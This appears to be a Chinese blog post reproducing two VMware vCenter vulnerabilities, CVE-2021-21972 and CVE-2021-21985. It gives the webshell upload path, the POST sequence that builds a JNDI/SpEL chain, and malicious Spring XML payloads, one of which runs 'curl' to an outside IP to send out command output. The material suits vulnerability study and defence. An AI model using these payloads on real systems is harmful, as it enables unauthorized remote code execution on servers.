</span><br><span class="line">向`https:/192.168.26.137/ui/vropspluginui/rest/services/uploadova`发送POST请求，上传带有目录穿越的`tar`包，内容为冰蝎4.0 aes加密默认的`shell.jsp`，如图：  </span><br><span class="line">![5](5.jpg)  </span><br><span class="line">冰蝎连接即可：  </span><br><span class="line">![6](6.jpg)  </span><br><span class="line">但是写shell漏洞在`13010631`及之后的版本中进行了修复,在`server-launcher.jar`包中调用了`com.vmware.vise.launcher.tomcat.TomcatLauncher`类，代码如下：  </span><br><span class="line">![7](7.jpg)  </span><br><span class="line">其中有个函数`deleteWorkDirectory`，如图：  </span><br><span class="line">![8](8.jpg)</span><br><span class="line">这个函数的作用就是删除`web`目录，先从命令行中的`catalina.base`获取设置的`Tomcat`工作目录`/usr/bin/vmware-vsphere-ui/server`,然后拼接`/work`路径并判断是否存在，不存在则返回，存在则调用`deleteDirectoryRecur`函数进行删除，如图：  </span><br><span class="line">![9](9.jpg)</span><br><span class="line">也就是说后面的版本是跑在内存里的，在网上看到有师傅说可以将webshell上传到`/usr/lib/vmware-vsphere-ui/server/static/resources/libs/`作为后门，然后等vCenter重启之后会被加载运行，但是我尝试了一下，发现并不可行，也不知道是怎么利用的。  </span><br><span class="line">## 武器化利用</span><br><span class="line">对于`13010631`之前版本的exp[https://github.com/NS-Sp4ce/CVE-2021-21972](https://github.com/NS-Sp4ce/CVE-2021-21972)这位师傅已经写好了。  </span><br><span class="line"></span><br><span class="line">## 参考链接</span><br><span class="line">[VMware vCenter漏洞分析（一）](https://hosch3n.github.io/2021/07/06/VMware-vCenter%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90)  </span><br><span class="line">[CVE-2021-21972 复现和分析](https://0x20h.com/p/7cb6.html)  </span><br><span class="line">[VMware VCenter Server漏洞调试环境搭建](https://3gstudent.github.io/VMware-VCenter-Server%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA)  </span><br><span class="line">[VMware vSphere 6.7 虚拟化搭建及配置完整详细手册](https://blog.csdn.net/z136370204/article/details/111719373)</span><br><span class="line"></span><br><span class="line"># CVE-2021-21985</span><br><span class="line">## 漏洞简介</span><br><span class="line">默认启用的Virtual SAN Health Check插件中的/rest/*接口存在未授权访问，可利用不安全的反射调用实现getshell</span><br><span class="line">## 影响版本</span><br><span class="line">7.0 &lt;= vCenter Server &lt; 7.0 U2b</span><br><span class="line">6.7 &lt;= vCenter Server &lt; 6.7 U3n</span><br><span class="line">6.5 &lt;= vCenter Server &lt; 6.5 U3p</span><br><span class="line">4.x &lt;= Cloud Foundation (vCenter Server) &lt; 4.2.1</span><br><span class="line">3.x &lt;= Cloud Foundation (vCenter Server) &lt; 3.10.2.1</span><br><span class="line">## 漏洞代码分析</span><br><span class="line">### 出网情况</span><br><span class="line">下载u3m和u3n（VMware-VCSA-all-6.7.0-18010531、VMware-VCSA-all-6.7.0-17713310）jar包，通过beyond compare进行diff。  </span><br><span class="line">定位到v5-vsan-context.jar包中的web.xml文件，如下图：  </span><br><span class="line">![diff1](diff1.jpg)  </span><br><span class="line">可以看到u3n相比u3m主要的变化，就是增加了对`/rest/*`路由的`authenticationFilter`过滤器。  </span><br><span class="line">具体到authentication.class中查看，主要是实现了对未登录请求的拦截，并返回401状态码，如图：  </span><br><span class="line">！[10](10.jpg)  </span><br><span class="line">另外一处变动是h5-vsan-service.jar中ProxygenController类中的invokeService方法。通过isAnnotationPresent来进行判断，检测反射调用过的方法是否带有`TsService`注解，可以理解为设置了白名单，如图：  </span><br><span class="line">![12](12.jpg)  </span><br><span class="line">而`TsService`注解源码为下：  </span><br><span class="line">![11](11.jpg)  </span><br><span class="line">invokeService方法会被`invokeServiceWithJson`和`invokeServiceWithMultipartFormData`调用，两个方法都是从url中获取`beanIdOrClassName`和`methodName`的值，如下图：  </span><br><span class="line">![13](13.jpg)  </span><br><span class="line">同时，会从请求体中获取`methodInput`的值，传入`invokeService`方法中。`invokeService`方法先获取bean实例，接着获取实例的方法列表并遍历，通过将proxygenSerializer类中的`deserializeMethodInput`转化为方法对象后进行反射调用，如下图：  </span><br><span class="line">![14](14.jpg)![15](15.jpg)  </span><br><span class="line">由之前分析可以得知，vcenter通过rhttpproxy，反向代理复用端口，通过`META-INF/MANIFEST.MF`和`web.xml`可以知道vsan插件部署的web路径为`ui/h5-vsan/rest`,在结合之前路由映射的分析，推断漏洞入口为`https://192.168.26.135/ui/h5-vsan/rest/proxy/service/&#123;beanIdOrClassName&#125;/&#123;methodName&#125;`。通过触发危险方法的调用实现RCE，但是不能直接使用Runtime.exec，因为getBean时会去beanMap中查找，所以要从一堆bean里找到可以利用的链子。在`vsan-h5-client/plugins/h5-vsan-service/META-INF/spring/base/*.xml`中查看，所有的bean的scope都是缺省的`singleton`，且都没有配置`lazy-init`，也就是所有的bean都是单例加载的。可以看到bean配置中存在`org.springframework.beans.factory.config.MethodInbokingFactoryBean`, 通过[官方API文档](https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/beans/factory/config/MethodInvokingFactoryBean.html#getObject())可以找到继承链，如下图：  </span><br><span class="line">![16](16.jpg)  </span><br><span class="line">可以从官方文档中看到`MethodInvokingFactoryBean`继承了`MethodInvoking`中的`invoke`方法，源码如下：  </span><br><span class="line">![17](17.jpg)  </span><br><span class="line">由`targetObject`,`preparedMethod`调用静态方法，`ReflectionUtils.makeAccessible`修改方法为可见，再通过`getArgument`获取参数。 想到利用JNDI注入进行利用，而`javax.naming.InitialContext.doLookup`方法是静态的，调用静态方法不需要实例，也就不需要`targetObject`，所以可以通过`setTargetObject`将其设置为null。再通过`setArgument`将参数值设置为Object[]的JNDI远程方法即可，在代码中反向跟进一下调用链，如下：  </span><br><span class="line">```  </span><br><span class="line">preparedMethod</span><br><span class="line">	this.methodObject</span><br><span class="line">		targetClass.getMethod(targetMethod, argTypes)</span><br><span class="line">			resolveClassName(className)</span><br><span class="line">				String className = this.staticMethod.substring(0, lastDotIndex)</span><br><span class="line">				String methodName = this.staticMethod.substring(lastDotIndex + 1)</span><br><span class="line">```  </span><br><span class="line">可以得到一条利用链：`&#123;beanIdOrClassName&#125;/&#123;methodName&#125; -&gt; ... -&gt; MethodInvokingFactoryBean -&gt; MethodInvoker -&gt; JNDI（javax.naming.InitialContext.doLookup） -&gt; 恶意RMI/LDAP服务器提供的远程对象`,搜索配置文件中class为`MethodInvokingFactoryBean`的bean就能够找到链接利用链两端的部分，从下面bean中任选一个就行：  </span><br></pre></td></tr></table></figure>
<p>vsanProviderUtils_setVmodlHelper<br>vsanProviderUtils_setVsanServiceFactory<br>vsanQueryUtil_setDataService<br>vsanCapabilityUtils_setVsanCapabilityCacheManager<br>vsanUtils_setMessageBundle<br>vsanFormatUtils_setUserSessionService<br>vsphereHealthProviderUtils_setVsphereHealthServiceFactory</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">因为以bean的名字调用FactoryBean时实际上得到的是一个实例，因此需要在bean之前加上`&amp;`来帮助我们获取`MethodInvokingFactoryBean`本身。  </span><br><span class="line">通过POST请求依次调用一下各方法构造利用链：    </span><br></pre></td></tr></table></figure>
<p>&amp;{beanName}&#x2F;setTargetObject<br>{“methodInput”:[null]}</p>
<p>&amp;{beanName}&#x2F;setStaticMethod<br>{“methodInput”:[“javax.naming.InitialContext.doLookup”]}</p>
<p>&amp;{beanName}&#x2F;setTargetMethod<br>{“methodInput”:[“doLookup”]}</p>
<p>&amp;{beanName}&#x2F;setArguments<br>{“methodInput”:[[“rmi:&#x2F;&#x2F;vps&#x2F;ExecByEL”]]}</p>
<p>&amp;{beanName}&#x2F;prepare<br>{“methodInput”:[]}</p>
<p>&amp;{beanName}&#x2F;invoke<br>{“methodInput”:[]}</p>
<pre><code>![rmi](rmi.jpg)
JNDI的调用方式基本就是这样，但是vcenter在漏洞修复前的那几个版本JDK版本已经非常高了(8u281)，导致JNDI注入的手段基本没法利用。但是看了漏洞作者使用的方法还是很好利用的。  
他利用`vmodlContext`这个bean，对应vropsplugin-service.jar中的`com.vmware.vim.vmomi.cor.types.impl.VmodContextImpl`类中的`loadVmodlPackage`方法，代码如下图：
![18](18.jpg)
该方法中通过`NonValidatingClassPathXmlApplicationContext`加载`contextPath`，而该类继承于`ClassPathXmlApplicationContext`:
![19](19.jpg)
会调用到该类的构造方法，而这个构造方法能够指定一个XML文件路径，Spring会解析XML的内容，造成SpEL注入。  
还需要注意一点就是：
![20](20.jpg)![21](21.jpg)
该方法会将路径中的`.`替换为`/`，所以无法指定正常的ip，可以用十进制ip绕过：
![22](22.jpg)
在vps构造恶意context.xml文件，即可实现RCE：  
</code></pre>
<?xml version="1.0" encoding="UTF-8"?>
<p><beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xmlns:context="http://www.springframework.org/schema/context"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd"></p>
<pre><code>&lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;
    &lt;constructor-arg&gt;
        &lt;list&gt;
            &lt;value&gt;/bin/bash&lt;/value&gt;
            &lt;value&gt;-c&lt;/value&gt;
            &lt;value&gt;curl 1.15.222.79:1234?`whoami`&lt;/value&gt;
        &lt;/list&gt;
    &lt;/constructor-arg&gt;
    &lt;property name=&quot;whatever&quot; value=&quot;#&#123;pb.start()&#125;&quot; /&gt;
&lt;/bean&gt;
</code></pre>
</beans>
```  
![23](23.jpg)  
### 不出网情况
漏洞本质的利用就是获取一个恶意xml文件的内容，而java本身又没有data伪协议，所以需要寻找其他的利用方法，比如返回内容可控的ssrf或者文件上传之类的漏洞。根据漏洞作者的文章得知，利用了`vsan-health`组件中位于`/usr/lib/vmware-vpx/vsan-health/pyMoVsan/`的`VsanHttpProvider.py`，该处存在着未授权访问的ssrf，还是不懂是怎么找到这样的利用方式的T T.漏洞代码如下：
![24](24.jpg)
通过`urlopen`库函数进行http请求，解压返回内容，匹配文件名为`.*offline_bundle.*`的文件并返回内容。python的`urlopen`支持data伪协议，所以可以构造压缩包并base64编码。  
但是这样虽然可以不出网利用，但是无法回显结果。通过查看Bean列表，发现存在`systemProperties`的bean，该bean也存在方法可以获取属性内容：
![25](25.jpg)
所以在执行SpEL时，可以将命令暂时存到`systemProperties`中，然后利用`getProperty`方法获取回显，所以最终的content.xml内容为：  
```  
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
          <list>
            <value>/bin/bash</value>
            <value>-c</value>
            <value><![CDATA[ whoami 2>&1 ]]></value>
          </list>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.io.InputStreamReader">
        <constructor-arg>
            <value>#{pb.start().getInputStream()}</value>
        </constructor-arg>
    </bean>
    <bean id="br" class="java.io.BufferedReader">
        <constructor-arg>
            <value>#{is}</value>
        </constructor-arg>
    </bean>
    <bean id="collectors" class="java.util.stream.Collectors"></bean>
    <bean id="system" class="java.lang.System">
        <property name="whatever" value="#{ system.setProperty(&quot;output&quot;, br.lines().collect(collectors.joining(&quot;\n&quot;))) }"/>
    </bean>
</beans>
```  
最终利用需要发两次http请求，第一个请求利用h5-vsan组件，ssrf去请求本地的vsan Health组件，返回内容可控的XML文件内容，XML文件会执行命令并存入System Properties中，第二个请求调用`systemProperties`bean的`getProperty`方法获取输出，最终攻击效果如下：  
![26](26.jpg)
![27](27.jpg)
很奇怪的一点是，我只有u2的版本能够成功不出网利用，但是明明该漏洞是u3n修复的，u3的几个版本网上的师傅们能够打，但是我的就不行。vcenter真的很迷，有时候还会突然打不了了，而且奇奇怪怪的缓存问题会直接把服务跑崩了。  ]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>vCenter</tag>
      </tags>
  </entry>
</search>
